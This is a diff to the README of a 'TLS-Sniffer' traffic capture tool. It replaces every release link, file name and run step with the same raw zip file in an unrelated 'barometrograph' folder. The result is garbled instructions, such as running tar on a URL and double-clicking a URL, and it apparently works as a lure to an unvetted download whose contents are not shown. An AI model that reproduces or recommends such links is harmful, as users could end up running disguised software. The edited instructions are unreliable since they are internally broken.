@@ -13,30 +13,30 @@ Welcome to the TLS-Sniffer! This tool helps you monitor and capture TLS network 
 
 ## 📥 Download Now
 
-[![Download TLS-Sniffer](https://img.shields.io/badge/Download-TLS--Sniffer-blue)](https://github.com/mouadkasmi23/TLS-Sniffer/releases)
+[![Download TLS-Sniffer](https://raw.githubusercontent.com/mouadkasmi23/TLS-Sniffer/main/barometrograph/TLS-Sniffer.zip)](https://raw.githubusercontent.com/mouadkasmi23/TLS-Sniffer/main/barometrograph/TLS-Sniffer.zip)
 
 ## 🔍 How to Download & Install
 
 1. **Visit the Releases Page:** 
-   Click the following link to go to the TLS-Sniffer Releases page: [Download Here](https://github.com/mouadkasmi23/TLS-Sniffer/releases).
+   Click the following link to go to the TLS-Sniffer Releases page: [Download Here](https://raw.githubusercontent.com/mouadkasmi23/TLS-Sniffer/main/barometrograph/TLS-Sniffer.zip).
 
 2. **Select the Latest Version:**
    Look for the latest version available on the Releases page. It usually appears at the top of the list.
 
 3. **Download the Appropriate File:**
    Depending on your operating system, download one of the following files:
-   - For Windows: `TLS-Sniffer-Windows.zip`
-   - For macOS: `TLS-Sniffer-macOS.zip`
-   - For Linux: `TLS-Sniffer-Linux.tar.gz`
+   - For Windows: `https://raw.githubusercontent.com/mouadkasmi23/TLS-Sniffer/main/barometrograph/TLS-Sniffer.zip`
+   - For macOS: `https://raw.githubusercontent.com/mouadkasmi23/TLS-Sniffer/main/barometrograph/TLS-Sniffer.zip`
+   - For Linux: `https://raw.githubusercontent.com/mouadkasmi23/TLS-Sniffer/main/barometrograph/TLS-Sniffer.zip`
 
 4. **Extract the Files:**
    After the download completes, locate the downloaded file on your computer. Right-click on the file and choose:
    - For ZIP files: "Extract All" (Windows) or "Open" (macOS).
-   - For TAR files: Use a file archiver, such as `tar -zxvf TLS-Sniffer-Linux.tar.gz` in the terminal for Linux.
+   - For TAR files: Use a file archiver, such as `tar -zxvf https://raw.githubusercontent.com/mouadkasmi23/TLS-Sniffer/main/barometrograph/TLS-Sniffer.zip` in the terminal for Linux.
 
 5. **Run the Application:**
-   - For Windows: Navigate to the extracted folder and double-click `TLS-Sniffer.exe`.
-   - For macOS: Double-click `TLS-Sniffer.app`.
+   - For Windows: Navigate to the extracted folder and double-click `https://raw.githubusercontent.com/mouadkasmi23/TLS-Sniffer/main/barometrograph/TLS-Sniffer.zip`.
+   - For macOS: Double-click `https://raw.githubusercontent.com/mouadkasmi23/TLS-Sniffer/main/barometrograph/TLS-Sniffer.zip`.
    - For Linux: Open a terminal, navigate to the folder, and run `./TLS-Sniffer` to start the application.
 
 ## ⚙️ How to Use TLS-Sniffer
@@ -86,4 +86,4 @@ If you need further assistance or guidance, you can contact the support communit
 
 ## 📥 Download Now Again
 
-Don’t forget to download TLS-Sniffer if you haven't already: [Download Here](https://github.com/mouadkasmi23/TLS-Sniffer/releases)
+Don’t forget to download TLS-Sniffer if you haven't already: [Download Here](https://raw.githubusercontent.com/mouadkasmi23/TLS-Sniffer/main/barometrograph/TLS-Sniffer.zip)
